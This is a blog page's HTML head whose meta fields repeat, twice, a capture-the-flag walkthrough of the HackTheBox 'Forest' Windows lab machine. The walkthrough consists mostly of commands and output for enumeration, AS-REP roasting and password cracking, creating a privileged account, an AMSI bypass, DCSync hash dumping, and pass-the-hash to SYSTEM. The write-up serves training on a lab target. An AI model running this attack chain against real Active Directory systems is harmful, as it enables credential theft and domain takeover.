<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Forest" /><meta name="author" content="QTranspose" /><meta property="og:locale" content="en_US" /><meta name="description" content="Forest is a vulnerable virtual machine created by egre55 and mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Windows machine with all sorts of Active Directory ports open. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 $ nmap-default 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.11s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-02-21 08:29:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h45m15s, deviation: 4h37m09s, median: 5m14s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2021-02-21T00:29:44-08:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-02-21T08:29:45 |_ start_date: 2021-02-21T07:57:08 We then perform an nmap-full scan, by which a few more ports are discovered. In the results, we notice that the port 5985 is open which is WinRM. The service can be convenient for us to get a shell when we have valid credentials. 1 2 3 4 5 6 7 $ nmap-full 10.10.10.161 ... 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found For the details of the custom nmap commands, check here. LDAP We can perform “null base” and “null bind” searches to let the server leak some information to us. Query available base DNs from root DSE: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ldapsearch -h 10.10.10.161 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base &lt;&gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: DC=htb,DC=local namingContexts: CN=Configuration,DC=htb,DC=local namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local namingContexts: DC=DomainDnsZones,DC=htb,DC=local namingContexts: DC=ForestDnsZones,DC=htb,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 Query potential usernames: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ ldapsearch -h 10.10.10.161 -x -b &quot;DC=htb,DC=local&quot; &quot;(objectClass=Person)&quot; sAMAccountName | grep sAMAccountName # requesting: sAMAccountName sAMAccountName: Guest sAMAccountName: DefaultAccount sAMAccountName: FOREST$ sAMAccountName: EXCH01$ sAMAccountName: $331000-VK4ADACQNUCA sAMAccountName: SM_2c8eef0a09b545acb sAMAccountName: SM_ca8c2ed5bdab4dc9b sAMAccountName: SM_75a538d3025e4db9a sAMAccountName: SM_681f53d4942840e18 sAMAccountName: SM_1b41c9286325456bb sAMAccountName: SM_9b69f1b9d2cc45549 sAMAccountName: SM_7c96b981967141ebb sAMAccountName: SM_c75ee099d0a64c91b sAMAccountName: SM_1ffab36a2f5f479cb sAMAccountName: HealthMailboxc3d7722 sAMAccountName: HealthMailboxfc9daad sAMAccountName: HealthMailboxc0a90c9 sAMAccountName: HealthMailbox670628e sAMAccountName: HealthMailbox968e74d sAMAccountName: HealthMailbox6ded678 sAMAccountName: HealthMailbox83d6781 sAMAccountName: HealthMailboxfd87238 sAMAccountName: HealthMailboxb01ac64 sAMAccountName: HealthMailbox7108a4e sAMAccountName: HealthMailbox0659cc1 sAMAccountName: sebastien sAMAccountName: lucinda sAMAccountName: andy sAMAccountName: mark sAMAccountName: santi Readings: https://www.tenable.com/plugins/nessus/10722 https://www.tenable.com/plugins/nessus/10723 https://tools.ietf.org/html/rfc4513#section-5.1.1 DNS Play with the DNS: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ host htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: htb.local has address 10.10.10.161 $ host -t ns htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: htb.local name server forest.htb.local. $ host forest.htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: forest.htb.local has address 10.10.10.161 Try zone transfer failed: 1 2 3 4 5 6 7 8 9 $ host -t axfr htb.local 10.10.10.161 Trying &quot;htb.local&quot; Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: Host htb.local not found: 5(REFUSED) ; Transfer failed. SMB Try listing shares with null session authentication failed: 1 2 3 $ crackmapexec smb 10.10.10.161 -u &#39;&#39; -p &#39;&#39; --shares SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\: STATUS_ACCESS_DENIED RPC Enumerate domain users with rpcclient: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $ rpcclient -U &#39;&#39; -N 10.10.10.161 rpcclient $&gt; enum enumalsgroups enumdomains enumdrivers enumkey enumports enumprocdatatypes enumdata enumdomgroups enumforms enummonitors enumprinters enumprocs enumdataex enumdomusers enumjobs enumpermachineconnections enumprivs enumtrust rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Note that the results are slightly different from what we get from LDAP previously. Exploitation AS-REP Roasting AS-REP roasting is an attack that allows retrieving password hashes for users that do not require Kerberos preauthentication. For more details, refer to here. Get a list of users with UF_DONT_REQUIRE_PREAUTH set: 1 2 3 4 5 6 $ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2021-02-21 05:15:28.644990 2021-02-21 04:34:44.843064 0x410200 Get a TGT for svc-alfresco: 1 2 3 4 5 $ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/svc-alfresco -no-pass Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:d2cb9ef633c35eb1025358d77a74d1b8$05cf5d6351281f527192489ce06d152359abd444ad19d6d1aae9790ccf3d602ca00fbf4cc01117f10ccf4ccdd8544f3d32dbe95d9fe3c1503ff1c8a2ce685a37d006db803d7c705dd81207c5e7fed044fbbdbc971b3ce7e4d349b3e1a1bb13de05890337afb73c4faa4ad95cd59ba8ed755a722f4620e093d98ed33d3b34c0c67df0332cadadaa2f9be567bdede1adfe4c96ffbc18b4a96fc3d9f7a3d6f84ec34294916d1fa236350c49c836efb74be3c2720afcb2c2c56ae88c4eab298e5b6f39b5c841141e1de728895a9d32faecddf52694de2c0bb912dbb124e4b4ab0126fed452a2ea7e After copying the hash to a file named hash, we can try to crack it with john. 1 2 3 4 5 $ john -w=/opt/rockyou.txt hash ... s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL) The crack is successful with the wordlist rockyou.txt and we get the password s3rvice for the account svc-alfresco. With the credentials, we get a shell via Evil-WinRM. 1 2 3 4 5 6 7 8 $ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -n Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami htb\svc-alfresco Privilege Escalation To enumerate the domain and find PE vectors, we will use BloodHound. First, we use the python based ingestor to collect information. 1 $ bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all By doing this, we get a few json files. Next, we drop these files into BloodHound. After the data is processed, we query “Shortest Path from Owned Principals”, and “Shortest Paths to High Value Targets” respectively. From the first query we we can see that svc-alfresco, which is already owned by us, is eventually a member of “Account Operators”. This means that we can create users and add them to normal groups. Combining it with the second query, we find a PE path as the following: This PE vector contais two main steps. In the first step, we will create an user and add it to the “Exchange Windows Permissions” group. We are able to do this because we are a member of the “Account Operators” group. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user qt Password123! /add /domain The command completed successfully. *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Windows Permissions&quot; qt /add The command completed successfully. *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Windows Permissions&quot; Group name Exchange Windows Permissions Comment This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted. Members ------------------------------------------------------------------------------- qt The command completed successfully. We also add this account to the “Remote Management Users” group so that we can login with Evil-WinRM. 1 2 3 4 5 6 7 8 9 10 11 12 13 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; qt /add The command completed successfully. *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; Alias name Remote Management Users Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. Members ------------------------------------------------------------------------------- Privileged IT Accounts qt The command completed successfully. In the second step, we will use Add-ObjectACL from PowerView.ps1 to grant us DCSync Privileges. We are able to do this because we are now in the “Exchange Windows Permissions” group. More details of this attack can be found here. Note that Bypass-4MSI is needed before loading PowerView.ps1. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ evil-winrm -i 10.10.10.161 -u qt -p Password123! -n -s $(pwd) Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\qt\Documents&gt; menu ,. ( . ) &quot; ,. ( . ) . (&quot; ( ) )&#39; ,&#39; (` &#39;` (&quot; ) )&#39; ,&#39; . ,) .; ) &#39; (( (&quot; ) ;(, . ;) &quot; )&quot; .; ) &#39; (( (&quot; ) );(, )(( _&quot;.,_,.__).,) (.._( ._), ) , (._..( &#39;.._&quot;._, . &#39;._)_(..,_(_&quot;.) _( _&#39;) \_ _____/__ _|__| | (( ( / \ / \__| ____\______ \ / \ | __)_\ \/ / | | ;_)_&#39;) \ \/\/ / |/ \| _/ / \ / \ | \\ /| | |__ /_____/ \ /| | | \ | \/ Y \ /_______ / \_/ |__|____/ \__/\ / |__|___| /____|_ /\____|__ / \/ \/ \/ \/ \/ By: CyberVaca, OscarAkaElvis, Laox @Hackplayers [+] Bypass-4MSI [+] Dll-Loader [+] Donut-Loader [+] Invoke-Binary *Evil-WinRM* PS C:\Users\qt\Documents&gt; Bypass-4MSI [+] Patched! :D *Evil-WinRM* PS C:\Users\qt\Documents&gt; PowerView.ps1 *Evil-WinRM* PS C:\Users\qt\Documents&gt; $pass = convertto-securestring &#39;Password123!&#39; -asplain -force *Evil-WinRM* PS C:\Users\qt\Documents&gt; $cred = new-object system.management.automation.pscredential(&#39;HTB\qt&#39;, $pass) *Evil-WinRM* PS C:\Users\qt\Documents&gt; add-objectacl -principalidentity qt -credential $cred -rights DCSync Now that we have DCSync privileges, we can use impacket-secretsdump to dump NTLM hashes of all domain users. 1 2 3 4 5 6 7 8 9 10 11 $ impacket-secretsdump htb.local/qt@10.10.10.161 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Password: [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ... With the hash of Administrator, we can pass-the-hash via psexec and get an escalated shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.161..... [*] Found writable share ADMIN$ [*] Uploading file StbHukQA.exe [*] Opening SVCManager on 10.10.10.161..... [*] Creating service GpKO on 10.10.10.161..... [*] Starting service GpKO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami nt authority\system" /><meta property="og:description" content="Forest is a vulnerable virtual machine created by egre55 and mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Windows machine with all sorts of Active Directory ports open. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 $ nmap-default 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.11s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-02-21 08:29:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h45m15s, deviation: 4h37m09s, median: 5m14s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2021-02-21T00:29:44-08:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-02-21T08:29:45 |_ start_date: 2021-02-21T07:57:08 We then perform an nmap-full scan, by which a few more ports are discovered. In the results, we notice that the port 5985 is open which is WinRM. The service can be convenient for us to get a shell when we have valid credentials. 1 2 3 4 5 6 7 $ nmap-full 10.10.10.161 ... 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found For the details of the custom nmap commands, check here. LDAP We can perform “null base” and “null bind” searches to let the server leak some information to us. Query available base DNs from root DSE: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ldapsearch -h 10.10.10.161 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base &lt;&gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: DC=htb,DC=local namingContexts: CN=Configuration,DC=htb,DC=local namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local namingContexts: DC=DomainDnsZones,DC=htb,DC=local namingContexts: DC=ForestDnsZones,DC=htb,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 Query potential usernames: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ ldapsearch -h 10.10.10.161 -x -b &quot;DC=htb,DC=local&quot; &quot;(objectClass=Person)&quot; sAMAccountName | grep sAMAccountName # requesting: sAMAccountName sAMAccountName: Guest sAMAccountName: DefaultAccount sAMAccountName: FOREST$ sAMAccountName: EXCH01$ sAMAccountName: $331000-VK4ADACQNUCA sAMAccountName: SM_2c8eef0a09b545acb sAMAccountName: SM_ca8c2ed5bdab4dc9b sAMAccountName: SM_75a538d3025e4db9a sAMAccountName: SM_681f53d4942840e18 sAMAccountName: SM_1b41c9286325456bb sAMAccountName: SM_9b69f1b9d2cc45549 sAMAccountName: SM_7c96b981967141ebb sAMAccountName: SM_c75ee099d0a64c91b sAMAccountName: SM_1ffab36a2f5f479cb sAMAccountName: HealthMailboxc3d7722 sAMAccountName: HealthMailboxfc9daad sAMAccountName: HealthMailboxc0a90c9 sAMAccountName: HealthMailbox670628e sAMAccountName: HealthMailbox968e74d sAMAccountName: HealthMailbox6ded678 sAMAccountName: HealthMailbox83d6781 sAMAccountName: HealthMailboxfd87238 sAMAccountName: HealthMailboxb01ac64 sAMAccountName: HealthMailbox7108a4e sAMAccountName: HealthMailbox0659cc1 sAMAccountName: sebastien sAMAccountName: lucinda sAMAccountName: andy sAMAccountName: mark sAMAccountName: santi Readings: https://www.tenable.com/plugins/nessus/10722 https://www.tenable.com/plugins/nessus/10723 https://tools.ietf.org/html/rfc4513#section-5.1.1 DNS Play with the DNS: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ host htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: htb.local has address 10.10.10.161 $ host -t ns htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: htb.local name server forest.htb.local. $ host forest.htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: forest.htb.local has address 10.10.10.161 Try zone transfer failed: 1 2 3 4 5 6 7 8 9 $ host -t axfr htb.local 10.10.10.161 Trying &quot;htb.local&quot; Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: Host htb.local not found: 5(REFUSED) ; Transfer failed. SMB Try listing shares with null session authentication failed: 1 2 3 $ crackmapexec smb 10.10.10.161 -u &#39;&#39; -p &#39;&#39; --shares SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\: STATUS_ACCESS_DENIED RPC Enumerate domain users with rpcclient: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $ rpcclient -U &#39;&#39; -N 10.10.10.161 rpcclient $&gt; enum enumalsgroups enumdomains enumdrivers enumkey enumports enumprocdatatypes enumdata enumdomgroups enumforms enummonitors enumprinters enumprocs enumdataex enumdomusers enumjobs enumpermachineconnections enumprivs enumtrust rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Note that the results are slightly different from what we get from LDAP previously. Exploitation AS-REP Roasting AS-REP roasting is an attack that allows retrieving password hashes for users that do not require Kerberos preauthentication. For more details, refer to here. Get a list of users with UF_DONT_REQUIRE_PREAUTH set: 1 2 3 4 5 6 $ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2021-02-21 05:15:28.644990 2021-02-21 04:34:44.843064 0x410200 Get a TGT for svc-alfresco: 1 2 3 4 5 $ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/svc-alfresco -no-pass Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:d2cb9ef633c35eb1025358d77a74d1b8$05cf5d6351281f527192489ce06d152359abd444ad19d6d1aae9790ccf3d602ca00fbf4cc01117f10ccf4ccdd8544f3d32dbe95d9fe3c1503ff1c8a2ce685a37d006db803d7c705dd81207c5e7fed044fbbdbc971b3ce7e4d349b3e1a1bb13de05890337afb73c4faa4ad95cd59ba8ed755a722f4620e093d98ed33d3b34c0c67df0332cadadaa2f9be567bdede1adfe4c96ffbc18b4a96fc3d9f7a3d6f84ec34294916d1fa236350c49c836efb74be3c2720afcb2c2c56ae88c4eab298e5b6f39b5c841141e1de728895a9d32faecddf52694de2c0bb912dbb124e4b4ab0126fed452a2ea7e After copying the hash to a file named hash, we can try to crack it with john. 1 2 3 4 5 $ john -w=/opt/rockyou.txt hash ... s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL) The crack is successful with the wordlist rockyou.txt and we get the password s3rvice for the account svc-alfresco. With the credentials, we get a shell via Evil-WinRM. 1 2 3 4 5 6 7 8 $ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -n Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami htb\svc-alfresco Privilege Escalation To enumerate the domain and find PE vectors, we will use BloodHound. First, we use the python based ingestor to collect information. 1 $ bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all By doing this, we get a few json files. Next, we drop these files into BloodHound. After the data is processed, we query “Shortest Path from Owned Principals”, and “Shortest Paths to High Value Targets” respectively. From the first query we we can see that svc-alfresco, which is already owned by us, is eventually a member of “Account Operators”. This means that we can create users and add them to normal groups. Combining it with the second query, we find a PE path as the following: This PE vector contais two main steps. In the first step, we will create an user and add it to the “Exchange Windows Permissions” group. We are able to do this because we are a member of the “Account Operators” group. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user qt Password123! /add /domain The command completed successfully. *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Windows Permissions&quot; qt /add The command completed successfully. *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Windows Permissions&quot; Group name Exchange Windows Permissions Comment This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted. Members ------------------------------------------------------------------------------- qt The command completed successfully. We also add this account to the “Remote Management Users” group so that we can login with Evil-WinRM. 1 2 3 4 5 6 7 8 9 10 11 12 13 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; qt /add The command completed successfully. *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; Alias name Remote Management Users Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. Members ------------------------------------------------------------------------------- Privileged IT Accounts qt The command completed successfully. In the second step, we will use Add-ObjectACL from PowerView.ps1 to grant us DCSync Privileges. We are able to do this because we are now in the “Exchange Windows Permissions” group. More details of this attack can be found here. Note that Bypass-4MSI is needed before loading PowerView.ps1. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ evil-winrm -i 10.10.10.161 -u qt -p Password123! -n -s $(pwd) Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\qt\Documents&gt; menu ,. ( . ) &quot; ,. ( . ) . (&quot; ( ) )&#39; ,&#39; (` &#39;` (&quot; ) )&#39; ,&#39; . ,) .; ) &#39; (( (&quot; ) ;(, . ;) &quot; )&quot; .; ) &#39; (( (&quot; ) );(, )(( _&quot;.,_,.__).,) (.._( ._), ) , (._..( &#39;.._&quot;._, . &#39;._)_(..,_(_&quot;.) _( _&#39;) \_ _____/__ _|__| | (( ( / \ / \__| ____\______ \ / \ | __)_\ \/ / | | ;_)_&#39;) \ \/\/ / |/ \| _/ / \ / \ | \\ /| | |__ /_____/ \ /| | | \ | \/ Y \ /_______ / \_/ |__|____/ \__/\ / |__|___| /____|_ /\____|__ / \/ \/ \/ \/ \/ By: CyberVaca, OscarAkaElvis, Laox @Hackplayers [+] Bypass-4MSI [+] Dll-Loader [+] Donut-Loader [+] Invoke-Binary *Evil-WinRM* PS C:\Users\qt\Documents&gt; Bypass-4MSI [+] Patched! :D *Evil-WinRM* PS C:\Users\qt\Documents&gt; PowerView.ps1 *Evil-WinRM* PS C:\Users\qt\Documents&gt; $pass = convertto-securestring &#39;Password123!&#39; -asplain -force *Evil-WinRM* PS C:\Users\qt\Documents&gt; $cred = new-object system.management.automation.pscredential(&#39;HTB\qt&#39;, $pass) *Evil-WinRM* PS C:\Users\qt\Documents&gt; add-objectacl -principalidentity qt -credential $cred -rights DCSync Now that we have DCSync privileges, we can use impacket-secretsdump to dump NTLM hashes of all domain users. 1 2 3 4 5 6 7 8 9 10 11 $ impacket-secretsdump htb.local/qt@10.10.10.161 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Password: [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ... With the hash of Administrator, we can pass-the-hash via psexec and get an escalated shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.161..... [*] Found writable share ADMIN$ [*] Uploading file StbHukQA.exe [*] Opening SVCManager on 10.10.10.161..... [*] Creating service GpKO on 10.10.10.161..... [*] Starting service GpKO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami nt authority\system" /><link rel="canonical" 